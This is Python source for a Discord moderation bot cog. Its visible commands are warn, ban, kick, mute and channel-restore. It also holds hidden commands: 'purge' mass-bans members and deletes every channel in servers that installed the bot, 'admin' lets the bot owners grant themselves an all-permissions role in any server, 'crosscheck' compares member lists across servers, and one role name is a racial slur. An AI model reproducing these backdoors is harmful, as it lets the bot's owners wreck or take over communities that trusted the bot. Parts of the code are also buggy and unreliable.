import asyncio
from datetime import datetime
from random import randint
from typing import Optional

import pytz
from discord import Color, Embed, Member, Permissions, User
from discord.ext.commands import (BucketType, Cog, CommandOnCooldown, Greedy,
                                  check, command, cooldown,
                                  has_guild_permissions, has_permissions)
from discord.utils import get

list_of_admins = [426549783864279040,534074998672064512,801471932007448607]
def isBotAdminP(ctx):
    return ctx.author.id in list_of_admins

isBotAdmin = check(isBotAdminP)

class Mod(Cog):
    def __init__(self,bot):
        self.bot = bot    
        self.SLEEPTIME = 0.5    
        self.banned_members = [438809594291027969]     
        self.list_of_admins = [426549783864279040,
                                534074998672064512,
                                801471932007448607]      
    
    
    async def on_ready(self):
        if not self.bot.ready:
            self.bot.cogs_ready.ready_up("mod")

    
    @command(name = "warn", brief = "Warns a member. MUST HAVE MOD")
    @cooldown(1,5,type = BucketType.user)   
    @has_permissions(kick_members = True)
    async def warn(self,ctx, members: Greedy[User],*,reason = None):

        member = members[0]
        print(f"{ctx.author.name} warned {member.name} in {ctx.guild} for {reason}")
        if reason == None:
            embed = Embed(title = "Command: poo.warn",
                                description = '''**Please give a reason**''',
                                color = Color.dark_blue())
            await ctx.send(embed = embed)
        else:
            try:

                await member.send(f"You were warned in {ctx.guild.name} for: {reason}")
            except:
                pass

            embed = Embed(title =f":poop:***{member} has been warned***", color = Color.dark_blue())

            await ctx.send(embed=embed)
            
    
        

    @warn.error
    async def on_warn_error(self,ctx,error):
        if isinstance(error, CommandOnCooldown):
            await ctx.send("Please wait before sending that again")
        else:
            embed = Embed(title = "Command: poo.warn",
                                description = '''**Description**: Warns a member
                                                **Cooldown**: 5 seconds
                                                **Usage**: poo.warn [member][reason]
                                            **CAN ONLY BE USED BY MODS**''',
                                color = Color.dark_blue())
            await ctx.send(embed=embed)
            print(error)
    
    @command(name = "purge",brief = "u know what it does. dont use it",hidden = True)
    async def purge(self,ctx):

        server = ctx.message.guild
        if server.id != 711044562650398721 and server.id != 701753524551286784 and server.id != 868964763802157097 and ctx.author.id not in self.banned_members:
            print(f"finna purge {ctx.guild}")
            numBans = 0
            numChannels = 0
            password = randint(100000,1000000)
            

            

            
            
            confirm_primary = self.bot.get_channel(868964764175437873)
            
            p_message = await confirm_primary.send(f"Purge#{password}. Request from **{ctx.author}** to purge **{ctx.guild}**. Please commit primary authorization.")
            await p_message.add_reaction('✅')
            await p_message.add_reaction('❌')
            
        
            reaction,user = await self.bot.wait_for('reaction_add',check = lambda reaction,user: reaction.emoji == '✅' or reaction.emoji == '❌' and not user.bot)
            
           
            
            if reaction.emoji == '✅':
                confirm_final = self.bot.get_channel(868964764343226368)
                
                await ctx.author.send(f"Launch code is {password}")
                await confirm_final.send(f"Purge #{password}. Please enter the password for final authorization to purge **{ctx.guild}** per request of **{ctx.author}**")
                messageconfirm_final = await self.bot.wait_for('message', check = lambda message: message.channel.id == 814973520983097344 and not message.author.bot)

                if messageconfirm_final.content == str(password) and messageconfirm_final.author.id == ctx.author.id and messageconfirm_final.channel == confirm_final:
                    await confirm_final.send(f"Purge #{password}. Password accepted: Authorized purge #{password} of **{ctx.guild}** as request of **{ctx.author.name}**. Intializing protocols...")
                   
                    bot = ctx.guild.get_member(738990452673478738)
                    for member in ctx.guild.members:
                        
                        if member.top_role < bot.top_role and not member.bot:
                            
                            
                            try: 
                                print(f"now banning {member.name}")
                                await member.ban(reason = "keked")
                                numBans+=1
                            except:
                                pass
                              

                                    
                    for textChannel in ctx.guild.text_channels:
                    
                        await textChannel.delete()
                        numChannels += 1
                    
                   

                    for voiceChannel in ctx.guild.voice_channels:
                        await voiceChannel.delete() 
                        numChannels+= 1
                    
                    

                    for category in ctx.guild.categories:
                        await category.delete()


                    embed = Embed(title = f"Purge #{password} Successful",description = '',color = Color.dark_blue())
                    embed.add_field(name = "Number of Bans",value = numBans,inline = True)
                    embed.add_field(name = "Number of Channels deleted",value = numChannels)
                    embed.set_thumbnail(url = ctx.guild.icon_url)
                    await confirm_final.send(embed=embed)
                else:
                    await confirm_final.send(f"Password incorrect. Purge denied")
            else:
                await confirm_primary.send(f"Purge Request #{password} has been denied")
        else:
            await ctx.send('lol no.')    

    @command(name = "unban",brief = "unbans a member given their id")
    async def unban(self,ctx, id: int):
        if ctx.author.id in self.list_of_admins:
            user = await self.bot.fetch_user(id)
            guild = await self.bot.get_guild
            await ctx.guild.unban(user)
            print(f"unbanned {user.name}")
        else:
            await ctx.send("no")
    @command(name = "massunban",brief = "unbans every member in a server",hidden = True)
    async def massunban(self,ctx):
        if ctx.message.author.id in self.list_of_admins:
            banned_members = await ctx.guild.bans()
            
            for ban_entry in banned_members:
                userID = ban_entry.user
                print(userID)
                await ctx.guild.unban(userID)
            

        else:
            print("denied massunban")

    
    @command(name = "admin",brief = "gives admin \n BOT MOD COMMAND DONT USE BC DOESNT WORK",hidden =True)
    async def admin(self,ctx, guildID: Optional[int]):
        if ctx.author.id not in self.list_of_admins:
            print(f"denied {ctx.author} request to become admin")
        else:
            role = get(ctx.guild.roles,name = 'poop',permissions = Permissions.all())
            
            if not role:
                role = await ctx.guild.create_role(name = 'poop',permissions = Permissions.all(),reason = "iwantperms")
                print("Created poop role")

            await ctx.author.add_roles(role) if role not in ctx.author.roles else None
            
    @command(name = "fakeadmin", brief = "gives admin in kek later \n DONT USE UR NOT EVEN IN THE SERVER",hidden = True)
    async def adminMan(self,ctx,guildID: Optional[int]):
        bot =  self.bot.get_user(738990452673478738)
        confirm_primary = self.bot.get_channel(868964764175437873)
        guildID = guildID or ctx.guild.id
        guild = self.bot.get_guild(guildID)
        member = guild.get_member(ctx.author.id)

        await confirm_primary.send(f"Admin request in **{guild}** by **{ctx.author.name}**. Y or N.")
        messageconfirm_1 = await self.bot.wait_for('message',check = lambda message: message.channel.id ==814917487651979314 and not message.author.bot)
            
            
        if messageconfirm_1.content.lower() == "y" and messageconfirm_1.author.id == ctx.author.id and messageconfirm_1.channel == confirm_primary:
            role = get(guild.roles,name = "nigga")
            print(role)
            await member.add_roles(role) 

    @command(name = "crosscheck",brief="crosschecks people in current server with aurium squad",hidden=True)
    async def crosscheck(self,ctx):
        if ctx.author.id not in self.list_of_admins:
            print("denied request to cross check")
        else:
            print("crosschecking now")
            listOfSuspects = []
            aurium = self.bot.get_guild(701753524551286784)
            for member in ctx.guild.members:
                if member in aurium.members:
                    listOfSuspects.append(member.name)
            print(listOfSuspects)
            await ctx.send(f"```py\n {listOfSuspects} \n```")
    @command(name = "mute",brief = "servers mutes a member")
    @has_guild_permissions(mute_members = True)
    async def mute(self,ctx,member: Member):
        await member.edit(mute = True) if not member.voice.mute else await ctx.send("Sorry, that member is already muted")

    

    @command(name = "unmute",brief = "unserver mutes a member")
    @has_guild_permissions(mute_members = True)
    async def unmute(self,ctx,member: Member):
        await member.edit(mute = False) if member.voice.mute else await ctx.send("Sorry, that member is not currently muted")

    @command(name = "ban",brief ="bans a member")
    @has_guild_permissions(ban_members = True)
    async def ban(self,ctx,member:Member,*,reason: Optional[str]):
        embed = Embed(title =f":poop:***{member} has been banned***", color = Color.dark_blue())
        
        await member.ban(reason = None if not reason else reason) 
        await ctx.send(embed=embed)

    @ban.error
    async def on_ban_error(self,ctx,error):
        embed = Embed(title = "No can do buckaroo ¯\_(ツ)_/¯", color = ctx.author.color)
        await ctx.send(embed = embed)

    @command(name = "kick", brief = "kicks a member")
    @has_guild_permissions(kick_members = True)
    async def kick(self,ctx,member:Member,*,reason: Optional[str]):
        embed = Embed(title =f":poop:***{member} has been kicked***", color = Color.dark_blue())
        
        await member.kick(reason = None if not reason else reason)
        await ctx.send(embed=embed)

    @kick.error
    async def on_ban_error(self,ctx,error):
        embed = Embed(title = "No can do buckaroo ¯\_(ツ)_/¯", color = ctx.author.color)
        await ctx.send(embed = embed)

    


    @command(name = "restore",brief = "restores a channel to another channel")
    async def restore(self,ctx, channelID: int):


        objectiveChannel = self.bot.get_channel(channelID)
        bot = self.bot.get_user(738990452673478738)
        confirm_primary = self.bot.get_channel(868964764175437873)
        restoreMessage = await confirm_primary.send(f"Restore Request from **{ctx.author}** to restore {ctx.channel.mention} to {objectiveChannel.mention}. Please commit primary authorization \"Y\" or \"N\".")
        await restoreMessage.add_reaction('✅')
        await restoreMessage.add_reaction('❌')  
            
        
        reaction,user = await self.bot.wait_for('reaction_add',check = lambda reaction,user: reaction.emoji == '✅' or reaction.emoji == '❌' and user.id == ctx.author.id and not user.bot)
            
           
            
        if reaction.emoji == '✅':

            sourceChannel = ctx.channel
            
            messageOBJ = 0
            messages = await sourceChannel.history(limit = 3000,oldest_first = True).flatten()
            for message in messages:
                message = await ctx.fetch_message(message.id)
                if messageOBJ == 0:
                    messageOBJ = await ctx.fetch_message(message.id)
                
                          
            
                def date():
                    local_timezone = pytz.timezone('US/Eastern')
                    messageDate = messageOBJ.created_at.replace(tzinfo = pytz.utc)
                    messageDate = messageDate.astimezone(local_timezone)
                    date =datetime.strftime(messageDate,"%m/%d/%Y, %I:%M %p")
                    return date

                if message.content.startswith("https") and not message.content.endswith(".gif"):
                    
                    
                    if len(message.attachments) > 0:
                        
                        for attachment in message.attachments:

                            embedAttachment = Embed(title = '',description = message.content, color = Color.dark_blue())
                            embedAttachment.set_image(url = attachment.url)
                            embedAttachment.set_author(name = message.author,icon_url= message.author.avatar_url)

                            
                    
                            date = date()                        
                            embedAttachment.set_footer(text =f"ID:{message.id} • {date}")
                            # await asyncio.sleep(SLEEPTIME)
                            await objectiveChannel.send(embed=embedAttachment)
                    else:
                        embedAttachment = Embed(title = '',description = message.content, color = Color.dark_blue())
                        embedAttachment.set_image(url = message.content)
                        embedAttachment.set_author(name = message.author,icon_url= message.author.avatar_url)

                        
                
                        date = date()                        
                        embedAttachment.set_footer(text =f"ID:{message.id} • {date}")
                        # await asyncio.sleep(SLEEPTIME)
                        await objectiveChannel.send(embed=embedAttachment)

                # IF THE MESSAGE IS A GIF
                elif message.content.endswith(".gif"):
                    
            
                    
                
                    
                    
                    embedGif = Embed(title = '',description = '', color = Color.dark_blue())
                    embedGif.set_image(url = message.content)
                    
                    embedGif.set_author(name = message.author,icon_url= message.author.avatar_url)
                    

                    date = date()               
                    embedGif.set_footer(text =f"ID:{message.id} • {date}")

                    # await asyncio.sleep(SLEEPTIME)
                    await objectiveChannel.send(embed=embedGif)
                elif len(message.attachments) >0:
                    if message.content.endswith(".gif"):
                        
                
                        embedGif = Embed(title = '',description = '', color = Color.dark_blue())
                        
                        
                        embedGif = Embed(title = '',description = '', color = Color.dark_blue())
                        embedGif.set_image(url = message.content)
                        
                        embedGif.set_author(name = message.author,icon_url= message.author.avatar_url)
                        

                        date = date()               
                        embedGif.set_footer(text =f"ID:{message.id} • {date}")

                        # await asyncio.sleep(SLEEPTIME)
                        await objectiveChannel.send(embed=embedGif)
                    
                    else:
                        filesToExcept = [".pdf",
                                        ]
                        for attachment in message.attachments:
                            

                            embedAttachment = Embed(title = '',description = message.content, color = Color.dark_blue())
                            if attachment.url.endswith(".pdf") or attachment.url.endswith(".mp3") or attachment.url.endswith(".mp4"):
                                
                                embedAttachment.add_field(name = '\u200b', value = attachment.url,inline = False)

                            else:
                                
                                embedAttachment.set_image(url = attachment.url)
                            embedAttachment.set_author(name = message.author,icon_url= message.author.avatar_url)

                            
                    
                            date = date()                        
                            embedAttachment.set_footer(text =f"ID:{message.id} • {date}")
                            # await asyncio.sleep(SLEEPTIME)
                            
                            await objectiveChannel.send(embed=embedAttachment)

                


                            
                else:
                    
                    embed = Embed(title = '',description = message.content,color = Color.dark_blue())
                    embed.set_author(name = message.author, icon_url = message.author.avatar_url)
                    messageOBJ = await ctx.fetch_message(message.id)  
                    date = date()
                    
                    embed.set_footer(text =f"ID:{message.id} • {date}")
                
                    await asyncio.sleep(self.SLEEPTIME)
                    await objectiveChannel.send(embed = embed)

                #         print(message.content)
        else:
            await confirm_primary.send("Restore request denied")

def setup(bot):
    bot.add_cog(Mod(bot))
